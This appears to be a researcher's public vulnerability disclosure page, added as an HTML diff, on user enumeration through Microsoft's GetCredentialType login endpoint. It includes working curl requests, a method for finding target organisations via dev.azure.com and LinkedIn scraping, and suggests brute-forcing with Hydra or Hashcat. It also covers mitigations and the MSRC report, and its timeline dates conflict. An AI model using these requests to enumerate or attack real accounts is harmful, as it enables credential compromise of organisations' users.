@@ -1,0 +1,484 @@
+﻿<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+      <title>Vulnerability Disclosure: User Enumeration in Microsoft Online Authentication Service | por Raphael Moreira </title>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="title" content="Vulnerability Disclosure: User Enumeration in Microsoft Online Authentication Service | por Raphael Moreira ">
+      
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <link rel="stylesheet" href="../../../../public/docfx.min.css">
+      <link rel="stylesheet" href="../../../../public/main.css">
+      <meta name="docfx:navrel" content="../../../../toc.html">
+      <meta name="docfx:tocrel" content="../../../toc.html">
+      
+      <meta name="docfx:rel" content="../../../../">
+      
+      
+      <meta name="docfx:docurl" content="https://github.com/raphaelmoreira/raphaelmoreira/blob/main/tool/docfx_project/aegis/divulgacao/microsoft/en-us/vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.md/#L1">
+      <meta name="loc:inThisArticle" content="In this article">
+      <meta name="loc:searchResultsCount" content="{count} results for &quot;{query}&quot;">
+      <meta name="loc:searchNoResults" content="No results for &quot;{query}&quot;">
+      <meta name="loc:tocFilter" content="Filter by title">
+      <meta name="loc:nextArticle" content="Next">
+      <meta name="loc:prevArticle" content="Previous">
+      <meta name="loc:themeLight" content="Light">
+      <meta name="loc:themeDark" content="Dark">
+      <meta name="loc:themeAuto" content="Auto">
+      <meta name="loc:changeTheme" content="Change theme">
+      <meta name="loc:copy" content="Copy">
+      <meta name="loc:downloadPdf" content="Download PDF">
+
+      <script type="module" src="./../../../../public/docfx.min.js"></script>
+
+      <script>
+        const theme = localStorage.getItem('theme') || 'auto'
+        document.documentElement.setAttribute('data-bs-theme', theme === 'auto' ? (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light') : theme)
+      </script>
+
+  </head>
+
+  <body class="tex2jax_ignore" data-layout="" data-yaml-mime="">
+    <header class="bg-body border-bottom">
+      <nav id="autocollapse" class="navbar navbar-expand-md" role="navigation">
+        <div class="container-xxl flex-nowrap">
+          <a class="navbar-brand" href="../../../../index.html">
+            <img id="logo" class="svg" src="../../../../logo.svg" alt="₵&#216;Đł₵Ɇ">
+            ₵&#216;Đł₵Ɇ
+          </a>
+          <button class="btn btn-lg d-md-none border-0" type="button" data-bs-toggle="collapse" data-bs-target="#navpanel" aria-controls="navpanel" aria-expanded="false" aria-label="Toggle navigation">
+            <i class="bi bi-three-dots"></i>
+          </button>
+          <div class="collapse navbar-collapse" id="navpanel">
+            <div id="navbar">
+              <form class="search" role="search" id="search">
+                <i class="bi bi-search"></i>
+                <input class="form-control" id="search-query" type="search" disabled="" placeholder="Search" autocomplete="off" aria-label="Search">
+              </form>
+            </div>
+          </div>
+        </div>
+      </nav>
+    </header>
+
+    <main class="container-xxl">
+      <div class="toc-offcanvas">
+        <div class="offcanvas-md offcanvas-start" tabindex="-1" id="tocOffcanvas" aria-labelledby="tocOffcanvasLabel">
+          <div class="offcanvas-header">
+            <h5 class="offcanvas-title" id="tocOffcanvasLabel">Table of Contents</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="offcanvas" data-bs-target="#tocOffcanvas" aria-label="Close"></button>
+          </div>
+          <div class="offcanvas-body">
+            <nav class="toc" id="toc"></nav>
+          </div>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="actionbar">
+          <button class="btn btn-lg border-0 d-md-none" style="margin-top: -.65em; margin-left: -.8em" type="button" data-bs-toggle="offcanvas" data-bs-target="#tocOffcanvas" aria-controls="tocOffcanvas" aria-expanded="false" aria-label="Show table of contents">
+            <i class="bi bi-list"></i>
+          </button>
+
+          <nav id="breadcrumb"></nav>
+        </div>
+
+        <article data-uid="">
+<h1 id="vulnerability-disclosure-user-enumeration-in-microsoft-online-authentication-service">Vulnerability Disclosure: User Enumeration in Microsoft Online Authentication Service</h1>
+
+<p>Data da publicação: 00/00/00 11:21</p>
+<hr>
+<p><a href="../vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.html">🇧🇷</a> | 🇺🇸</p>
+<h2 id="introduction">Introduction</h2>
+<p>This document aims to describe the user enumeration vulnerability discovered in <a href="https://login.microsoftonline.com/">Microsoft Online</a>
+authentication, which can be exploited both visually and programmatically in any application that integrates with the service.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The attack vector stems from both the observation of the behavior of return messages (visual) and the structure of the
+response from the respective endpoint (programmatic).</p>
+<h3 id="requirements">Requirements</h3>
+<p>Although the vulnerability is in the Microsoft Online authentication service, the following steps aim to demonstrate the
+exploitation briefly, in a controlled and secure environment, simulating the integration of the fictitious application
+<code>minha-app-com</code>.</p>
+<ul>
+<li>Access the <a href="https://learn.microsoft.com/en-us/entra/identity/authentication/overview-authentication">Azure AD (Microsoft Entra ID)</a> portal and register a new application through <a href="https://learn.microsoft.com/en-us/entra/identity-platform/quickstart-register-app?tabs=certificate#register-an-application">App Registration</a>;</li>
+<li>Choose the <a href="https://learn.microsoft.com/en-us/entra/identity-platform/access-tokens">Access Token</a> method;</li>
+<li>Grant the <code>email</code> and <code>User.Read</code> permissions via <a href="https://developer.microsoft.com/en-us/graph/graph-explorer">Microsoft Graph</a>.</li>
+</ul>
+<p>After registration, we obtain - among other values omitted for brevity - the <code>appId</code> parameter, used in constructing the <strong>URL</strong>
+that will redirect from <code>minha-app.com</code> to <code>login.microsoftonline.com</code>, where authentication will occur:</p>
+<pre><code class="lang-txt">https://login.microsoftonline.com/{appId}/oauth2/v2.0/authorize
+</code></pre>
+<p>We should also include the <code>clientId</code> and <code>code</code> parameters, obtained during the backend flow of <code>minha-app.com</code>:</p>
+<pre><code class="lang-txt">?client_id={clientId}&amp;response_type=code&amp;code_challenge={code}
+</code></pre>
+<p>Finally, we complete with the fixed parameters:</p>
+<pre><code class="lang-txt">&amp;code_challenge_method=S256
+&amp;redirect_uri=https://minha-aplicacao/successo
+&amp;scope=https://graph.microsoft.com/email
+&amp;prompt=select_account
+&amp;sso_reload=true
+</code></pre>
+<p>In the final set, the <strong>URL</strong> to be used by <code>minha-app.com</code> will be:</p>
+<pre><code class="lang-txt">https://login.microsoftonline.com/{appId}/oauth2/v2.0/authorize?client_id={clientId}&amp;response_type=code&amp;code_challenge={code}&amp;code_challenge_method=S256&amp;redirect_uri=https://minha-app.com/success&amp;scope=https://graph.microsoft.com/email&amp;prompt=select_account&amp;sso_reload=true
+</code></pre>
+<h3 id="visual-methodology">Visual Methodology</h3>
+<p>The <strong>URL</strong> will take you to the application's authentication service (<code>appId</code>), customized for the requesting tenant (<code>clientId</code>),
+which will require access credentials. From the analysis of the response pattern, it is possible to determine when the user
+exists or not.</p>
+<table>
+<thead>
+<tr>
+<th>Initial screen</th>
+<th>Enter invalid data</th>
+<th>Service confirms</th>
+<th>Correct domain, the message changes</th>
+<th>Correct user, password is requested</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/001-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/002-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/003-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/004-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/005-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<h3 id="programmatic-methodology">Programmatic Methodology</h3>
+<p>By inspecting the source code of the <code>login.microsoftonline.com</code> service and analyzing the network packets sent, we
+found the <code>GetCredentialType</code> endpoint. Extracting the request body, we obtain:</p>
+<pre><code>curl --location 'https://login.microsoftonline.com/common/GetCredentialType?mkt=pt-BR' \
+--header 'accept: application/json' \
+--header 'accept-language: pt-BR,pt;q=0.7' \
+--header 'canary: {canaryHash}' \
+--header 'client-request-id: {requestGuid}' \
+--header 'content-type: application/json; charset=UTF-8' \
+--header 'cookie: brcap=0; ESTSSSOTILES=1; AADSSOTILES=1; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension; ESTSAUTHLIGHT=+58498593-a7a2-422b-84bd-ef0fb1c85b0d; CCState={cstateHash}' \
+--header 'hpgact: 1800' \
+--header 'hpgid: 1104' \
+--header 'hpgrequestid: {hpgRequestGuid}' \
+--header 'origin: https://login.microsoftonline.com' \
+--header 'priority: u=1, i' \
+--header 'referer: https://login.microsoftonline.com/{appId}/oauth2/v2.0/authorize?client_id={clientId}&amp;response_type=code&amp;code_challenge={code}&amp;code_challenge_method=S256&amp;redirect_uri=https://minha-app.com/successo&amp;scope=https://graph.microsoft.com/email&amp;prompt=select_account&amp;sso_reload=true
+--header 'sec-ch-ua: &quot;Brave&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;' \
+--header 'sec-ch-ua-mobile: ?0' \
+--header 'sec-ch-ua-platform: &quot;Windows&quot;' \
+--header 'sec-fetch-dest: empty' \
+--header 'sec-fetch-mode: cors' \
+--header 'sec-fetch-site: same-origin' \
+--header 'sec-gpc: 1' \
+--header 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36' \
+--data-raw '{&quot;username&quot;:&quot;abacate@avocado.com.br&quot;,&quot;isOtherIdpSupported&quot;:true,&quot;checkPhones&quot;:false,&quot;isRemoteNGCSupported&quot;:true,&quot;isCookieBannerShown&quot;:false,&quot;isFidoSupported&quot;:true,&quot;originalRequest&quot;:&quot;{originalRequestHash}&quot;,&quot;country&quot;:&quot;BR&quot;,&quot;forceotclogin&quot;:false,&quot;isExternalFederationDisallowed&quot;:false,&quot;isRemoteConnectSupported&quot;:false,&quot;federationFlags&quot;:0,&quot;isSignup&quot;:false,&quot;flowToken&quot;:&quot;{flowToken}&quot;,&quot;isAccessPassSupported&quot;:true}'
+</code></pre>
+<p>Although the set of headers and parameters is extensive, suggesting secure handling regarding sending or origin, nothing
+is actually done with <code>requestGuid</code>, <code>cstateHash</code>, <code>hpgRequestGuid</code>, <code>originalRequestHash</code>, or <code>flowToken</code>. Considering
+that there is no verification or consistency of the object regarding its manipulation, we can remove them:</p>
+<pre><code class="lang-txt">curl --location 'https://login.microsoftonline.com/common/GetCredentialType?mkt=pt-BR' \
+--header 'Content-Type: application/json' \
+--header 'Cookie: fpc=Avu1jfhsb2hEhMRueZ1yZ9Q; stsservicecookie=estsfd; x-ms-gateway-slice=estsfd' \
+--data-raw '{  
+    &quot;username&quot;: &quot;abacate@avocado.com.br&quot;
+}'
+</code></pre>
+<p>Regardless of which format you use above, both will return the following structure:</p>
+<pre><code class="lang-json">{
+    &quot;Username&quot;: &quot;&quot;,
+    &quot;Display&quot;: &quot;&quot;,
+    &quot;IfExistsResult&quot;: 0,
+    &quot;IsUnmanaged&quot;: false,
+    &quot;ThrottleStatus&quot;: 0,
+    &quot;Credentials&quot;: {},
+    &quot;DfpProperties&quot;: {},
+    &quot;EstsProperties&quot;: {},
+    &quot;IsSignupDisallowed&quot;: false,
+    &quot;apiCanary&quot;: &quot;&quot;
+}
+</code></pre>
+<p>The <code>IfExistisResult</code> and <code>ThrottleStatus</code> fields respectively determine if the user exists and the status of resource
+control. This assertion is possible through the following behavioral observation:</p>
+<ul>
+<li>If <strong>user</strong> and <strong>domain</strong> <u>do not</u> exist, <code>IfExistisResult</code> and <code>ThrottleStatus</code> will be <code>1</code>;</li>
+<li>If <strong>user</strong> <u>does not</u> exist but the <strong>domain</strong> exists, <code>IfExistisResult</code> will be <code>1</code> and <code>ThrottleStatus</code> will be <code>0</code>;</li>
+<li>If <strong>user</strong> and <strong>domain</strong> exist, <code>IfExistisResult</code> and <code>ThrottleStatus</code> will be <code>0</code>;</li>
+</ul>
+<p>Thus, we confirm for the second time that it is possible to identify users through the service.</p>
+<p><em>Note: There are other changes in the <code>json</code> that assist in identification but have been omitted for brevity.</em></p>
+<h3 id="expanded-methodology">Expanded Methodology</h3>
+<p>Considering that the <a href="https://azure.microsoft.com/pt-br/products/devops">Azure DevOps</a> service also uses Microsoft Online,
+and its <strong>URL</strong> is accessible via <code>https://dev.azure.com/{organizationName}</code>, it is possible to scale the discovery through
+web scraping on a social network like LinkedIn to obtain the primary name of each company.</p>
+<p>With the list ready, automate the discovery until you get an <strong>HttpStatus</strong> <code>200</code>:</p>
+<pre><code>https://dev.azure.com/mcdonalds
+https://dev.azure.com/samsung
+https://dev.azure.com/ibm
+https://dev.azure.com/suaempresa
+...
+https://dev.azure.com/microsoft
+</code></pre>
+<p>Once the target is defined, simply apply any of the methodologies described in this document:</p>
+<table>
+<thead>
+<tr>
+<th>User does not exist in the domain</th>
+<th>User exists and is prompted for a password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/006-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+<td><img src="../../../../images/aegis/divulgacao/microsoft/007-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<p>In addition to obvious names as demonstrated above (admin, infra, hr, contact...), we can perform another web scraping on
+LinkedIn, this time focusing on employees of the target company. From names and surnames, generate all combinations (including
+hyphens, underscores, or periods) using tools like <strong>Crunch</strong>. With the data set ready, let brute force do the rest using
+software like <strong>John the Ripper</strong>, <strong>Hydra</strong>, or <strong>Hashcat</strong>.</p>
+<p>Users who do not have a second factor of security and use weak passwords will inevitably be subject to having their
+credentials compromised.</p>
+<h2 id="impact">Impact</h2>
+<p>This seemingly harmless information can significantly impact the organization's security, as the exposure of access
+credentials contributes to the increase and effectiveness of subsequent attacks, such as <em><strong>phishing</strong></em>,
+<strong>social engineering</strong>, and <strong>brute force</strong>.</p>
+<h3 id="phishing">Phishing</h3>
+<p>An attack that seeks to steal your money or identity by tricking you into revealing personal information, such as credit
+card numbers, banking details, or passwords on sites that pretend to be legitimate. Cybercriminals often impersonate trusted
+companies, friends, or acquaintances in a fake email message that contains a link to a phishing site. (Source: <a href="https://support.microsoft.com/pt-br/windows/proteja-se-contra-phishing-0c7ea947-ba98-3bd9-7184-430e1f860a44">Microsoft Support</a>).</p>
+<p>A subset of this practice is <em>spear phishing</em>, which involves the specialization of the attack where attackers conduct
+extensive research on the intended targets. This high level of personalization aims at specific individuals or companies,
+leading to financial fraud, stock price manipulation, espionage, or theft of confidential data for resale. It may also be
+designed to infect devices with malware. (Source: <a href="https://www.kaspersky.com.br/resource-center/definitions/spear-phishing">Kaspersky Resource Center</a>)</p>
+<h3 id="social-engineering">Social Engineering</h3>
+<p>Social engineering attacks manipulate people's emotions and instincts in ways that reliably lead them to share information
+they shouldn't, download software they shouldn't, visit sites they shouldn't, send money to criminals, or make other mistakes
+that compromise their personal or organizational security. (Source: <a href="https://www.ibm.com/br-pt/topics/social-engineering">IBM Think</a>).</p>
+<p>In addition to the aforementioned phishing and spear phishing, there are other types of social engineering attacks,
+including <em>baiting</em> (tricking by curiosity), <em>tailgating</em> (piggybacking on an unlocked device), <em>pretexting</em> (the false
+digital samaritan), <em>quid pro quo</em> (desirable but false services in exchange for information), <em>scareware</em> (manipulation
+through fear), and <em>watering hole</em> (infecting a real service).</p>
+<h3 id="brute-force">Brute Force</h3>
+<p>A brute force attack uses a trial-and-error method to guess login information or encryption keys. Attackers work through
+all possible combinations in hopes of hitting the correct one. (Source: <a href="https://www.kaspersky.com.br/resource-center/definitions/brute-force-attac">Kaspersky Resource Center</a>)</p>
+<p>A subtype of this type of attack is known as <em>Password Spraying</em>, which involves exhaustively attempting to use the same
+password across multiple accounts before trying another one. Password spraying attacks tend to be effective because many
+users not only reuse the same passwords across different services but also often use simple, easily guessable passwords.
+(Source: <a href="https://www.kaspersky.com.br/resource-center/definitions/what-is-password-spraying">Kaspersky Resource Center</a>)</p>
+<p>Although it may seem like searching for a &quot;needle in a haystack,&quot; advancements in artificial intelligence (AI) and large
+language models (LLMs) optimize, accelerate, and scale attacks, bypassing captchas and adjusting attack frequency without
+human intervention.</p>
+<p>The only place where human factors come into play is in password creation. The table below highlights the most commonly used
+passwords in Brazil in 2023:</p>
+<table>
+<thead>
+<tr>
+<th>Posição</th>
+<th>Senha</th>
+<th>Ocorrências</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1º</td>
+<td>admin</td>
+<td>204.846</td>
+</tr>
+<tr>
+<td>2º</td>
+<td>123456</td>
+<td>137.551</td>
+</tr>
+<tr>
+<td>3º</td>
+<td>12345678</td>
+<td>46.666</td>
+</tr>
+<tr>
+<td>4º</td>
+<td>102030</td>
+<td>28.034</td>
+</tr>
+<tr>
+<td>5º</td>
+<td>123456789</td>
+<td>24.834</td>
+</tr>
+<tr>
+<td>7º</td>
+<td>gvt12345</td>
+<td>10.684</td>
+</tr>
+<tr>
+<td>9º</td>
+<td>password</td>
+<td>8687</td>
+</tr>
+<tr>
+<td>11º</td>
+<td>123mudar</td>
+<td>8202</td>
+</tr>
+<tr>
+<td>15º</td>
+<td>fera@123</td>
+<td>6364</td>
+</tr>
+<tr>
+<td>20º</td>
+<td>Senha</td>
+<td>4762</td>
+</tr>
+</tbody>
+</table>
+<p>Source: <a href="https://nordpass.com/es/most-common-passwords-list/">Nordpass</a></p>
+<p>You can see more details about how quickly a password can be discovered in this article from <a href="https://www.hivesystems.com/blog/are-your-passwords-in-the-green">Hive Systems</a>.</p>
+<a href="../../../../images/aegis/divulgacao/microsoft/008-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" target="_blank">
+  <img src="../../../../images/aegis/divulgacao/microsoft/009-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline500x500.png" alt="Sua senha é segura?">
+</a>
+<br>
+<br>
+<h2 id="mitigation">Mitigation</h2>
+<p>To mitigate the user enumeration vulnerability, it's essential to implement robust security measures that make exploitation
+more difficult, such as:</p>
+<ul>
+<li><p><strong>Standardizing Error Messages</strong>: Ensure that all error messages during the authentication process are uniform and do</p>
+</li>
+<li><p>not provide hints about the validity of usernames. The same applies to response times of requests.</p>
+</li>
+<li><p><strong>Login Attempt Limits</strong>: Implement a policy to limit authentication attempts. After a predefined number of failed attempts,</p>
+</li>
+<li><p>temporarily block the account or require a waiting period.</p>
+</li>
+<li><p><strong>Access Monitoring and Logging</strong>: Configure monitoring and auditing for all authentication attempts. Regularly review</p>
+</li>
+<li><p>these logs to identify patterns of enumeration attacks.</p>
+</li>
+<li><p><strong>Use of CAPTCHAs</strong>: Add CAPTCHAs to the authentication process to hinder the automation of enumeration attacks.</p>
+</li>
+<li><p><strong>Tamper-Resistance Checks</strong>: Implement robust checks to ensure that requests cannot be exploited for tampering.</p>
+</li>
+</ul>
+<h3 id="relevance">Relevance</h3>
+<p>Robust access control policies, such as multi-factor authentication or <em>zero trust</em>, limit access for cybercriminals.
+However, the lack of uniform responses during access opens the door to user enumeration vulnerabilities, which are recognized
+risks by various security organizations.</p>
+<ul>
+<li><p><strong>OWASP (Open Web Application Security Project)</strong>: Frequently mentioned in the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a></p>
+</li>
+<li><p>and cited in the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-responses">Authentication Cheat Sheet</a>, it is also present in the categories:</p>
+<ul>
+<li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A1:2021 - Broken Access Control</a>;</li>
+<li><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">A7:2021 - Identification and Authentication Failures</a>;</li>
+<li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017 - Using Components with Known Vulnerabilities</a>.</li>
+</ul>
+</li>
+<li><p><strong>NIST (National Institute of Standards and Technology)</strong>: The practice is addressed in <a href="https://pages.nist.gov/800-63-3/sp800-63b.html">NIST SP 800-63B: Digital Identity Guidelines</a>, topic 8: <em>&quot;Threats and Security Considerations&quot;</em>.</p>
+</li>
+<li><p><strong>ISO (International Organization for Standardization)</strong>: Although it does not specifically mention user enumeration, the security guidelines of <a href="https://www.iso.org/standard/27001">ISO/IEC 27001</a> and <a href="https://www.iso.org/standard/44378.html">ISO/IEC 27034</a> emphasize the importance of protecting authentication information and adopting secure development practices.</p>
+</li>
+<li><p><strong>SEI CERT (Software Engineering Institute CERT)</strong>: The SEI CERT Coding Standards provide <a href="https://wiki.sei.cmu.edu/confluence/display/seccode/Top+10+Secure+Coding+Practices">10 secure coding practices</a> to avoid various vulnerabilities. Notably, item 8: <em>&quot;Practice defense in depth&quot;</em> emphasizes ensuring multiple layers of protection by combining techniques to reduce security gaps.</p>
+</li>
+<li><p><strong>CVE (Common Vulnerabilities and Exposures)</strong>: In addition to its base definition <a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</a>, many well-known services and software, such as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5487">WordPress</a>, <a href="https://nvd.nist.gov/vuln/detail/cve-2016-6210">OpenSSH</a>, and <a href="https://nvd.nist.gov/vuln/detail/cve-2021-4191">GitLab</a>, have been marked. Multiple user enumeration entries are <a href="https://www.opencve.io/cve?cvss=&amp;search=user+enumeration">regularly cataloged</a> in the CVE database.</p>
+</li>
+<li><p><strong>NVD (National Vulnerability Database)</strong>: Enriches a CVE and expands details with technical references, impact analysis, remediation guidance, and risk ratings (CVSS).</p>
+</li>
+</ul>
+<h2 id="report">Report</h2>
+<p>The discovery was properly reported to the <a href="https://msrc.microsoft.com/">Microsoft Security Response Center (MSRC)</a> through
+the <a href="https://www.microsoft.com/en-us/msrc/bounty">Microsoft Bug Bounty Program</a>, following responsible disclosure guidelines
+in accordance with ISO/IEC 29147:2018 and the CERT Guide to Coordinated Vulnerability Disclosure, aiming to ensure proper
+mitigation and protection of potentially affected users. Since the event was not deemed a vulnerability, I am making the
+scenario public to align understanding on the contexts where the vulnerability mentioned here should be considered a risk.</p>
+<h3 id="identification">Identification</h3>
+<ul>
+<li><strong>Identifier</strong>: microsoft_bounty_1¹ (<em>external tracking ID</em>)</li>
+<li><strong>Category</strong>: User Enumeration</li>
+<li><strong>Severity</strong>: 8.8/High</li>
+<li><strong><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N">CVSS</a></strong>:
+<pre><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N
+</code></pre>
+</li>
+</ul>
+<p><em>¹ Since the item was not considered a threat (even though it was reported twice), no CVE code was assigned.</em></p>
+<h3 id="timeline">Timeline</h3>
+<ul>
+<li><strong>Date of Discovery</strong>: April 26, 2024</li>
+<li><strong>Date of Notification to MSRC</strong>: April 27, 2024</li>
+<li><strong>Date of Analysis by MSRC</strong>: June 29, 2024</li>
+<li><strong>Date of Conclusion by MSRC¹</strong>: June 12, 2024</li>
+</ul>
+<h3 id="response-received">Response Received</h3>
+<pre><code class="lang-txt">MSRC Email communication 12 de jun. de 2024, 22:31
+Subject: RE: MSRC Case microsoft_bounty_1
+
+Hello Raphael,
+
+Thank you for submitting this issue to Microsoft. We appreciate the time taken to submit this report. Upon investigation, we have determined that this is not considered a security vulnerability for servicing. 
+
+Please refer https://learn.microsoft.com/en-us/entra/fundamentals/users-default-permissions#restrict-member-users-default-permissions
+
+As such this case is now closed.
+Thank you for working with us and we look forward to more reports from you in the future!
+
+Warm regards,
+MSRC
+</code></pre>
+<p>The <a href="https://learn.microsoft.com/en-us/entra/fundamentals/users-default-permissions#restrict-member-users-default-permissions">referred link</a>
+discusses access permissions between authenticated users and guests, with the intent of restricting access. However, it
+does not apply to the issue demonstrated in this document, as the vulnerability can be exploited freely.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><p><strong><a href="https://www.iso.org/standard/72311.html">ISO/IEC 27034-1:2011 - Application security</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://insights.sei.cmu.edu/documents/1945/2017_003_001_503340.pdf">CERT Guide to Coordinated Vulnerability Disclosure</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://nvd.nist.gov/vuln">NVD (National Vulnerability Database)</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://www.first.org/cvss/calculator/4.0">CVSS (Common Vulnerability Scoring System) Calculator</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP Authentication Cheat Sheet</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://pages.nist.gov/800-63-3/sp800-63b.html">NIST Special Publication 800-63B</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://insights.sei.cmu.edu/documents/1945/2017_003_001_503340.pdf">CERT Guide to Coordinated Vulnerability Disclosure</a></strong>;</p>
+</li>
+<li><p><strong><a href="https://nvd.nist.gov/">NVD Vulnerability Database</a></strong>.</p>
+</li>
+</ul>
+<h2 id="conclusion">Conclusion</h2>
+<p>The discovery of this vulnerability in Microsoft Online's authentication service highlights the ongoing importance of
+security reviews and compliance with international standards. However, the failure to recognize it as a flaw raises the
+question of when a vulnerability should be treated as a risk.</p>
+<p>Security companies that conduct penetration testing, such as <a href="https://trackerconsultoria.com.br/">Tracker</a>, <a href="https://desecsecurity.com/">Desec</a>,
+<a href="https://hackersec.com">HackerSec</a>, <a href="https://ravel.com.br/servico-de-pentest-teste-de-intrusao">Ravel</a>,
+<a href="https://www.kaspersky.com.br/enterprise-security/penetration-testing">Kaspersky</a>, <a href="https://www.tempest.com.br/">Tempest</a>,
+<a href="https://esecurity.com.br/pentest/">e-Security</a>, <a href="https://vantico.com.br/">Vantico</a>, or <a href="https://tivit.com/solucoes/cybersecurity/">Tivit</a>,
+follow industry standards, and therefore, Microsoft Online's authentication should also be subject to the same scrutiny.</p>
+
+</article>
+
+        <div class="contribution d-print-none">
+          <a href="https://github.com/raphaelmoreira/raphaelmoreira/blob/main/tool/docfx_project/aegis/divulgacao/microsoft/en-us/vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.md/#L1" class="edit-link">Edit this page</a>
+        </div>
+
+        <div class="next-article d-print-none border-top" id="nextArticle"></div>
+
+      </div>
+
+      <div class="affix">
+        <nav id="affix"></nav>
+      </div>
+    </main>
+
+    <div class="container-xxl search-results" id="search-results"></div>
+
+    <footer class="border-top text-secondary">
+      <div class="container-xxl">
+        <div class="flex-fill">
+          <span>Made with <a href="https://dotnet.github.io/docfx">docfx</a></span>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
